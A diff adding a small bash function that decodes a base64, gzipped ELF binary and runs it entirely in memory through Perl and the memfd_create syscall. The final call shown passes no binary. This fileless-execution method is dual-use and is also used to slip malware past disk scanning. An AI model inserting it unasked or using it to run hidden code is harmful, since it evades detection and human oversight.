@@ -1,0 +1,21 @@
+#!/usr/bin/env bash
+# From: https://unix.stackexchange.com/a/492559/257838
+# And: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
+
+execute_elf_string(){
+  local bin_encoded=$1
+  perl -e '
+    # Create memfd
+    my $name = "";
+    my $fd = syscall(319, $fn, 0);
+    if (-1 == $fd) { die "memfd_create: $!"; }
+    # Copy binary
+    open(my $fh, ">&=".$fd) or die "open: $!";
+    my $bin = `echo "'"$bin_encoded"'" | base64 -d | gunzip`;
+    print $fh $bin;
+    # Execute
+    exec {"/proc/$$/fd/$fd"} "memfd";
+  '
+}
+
+execute_elf_string 
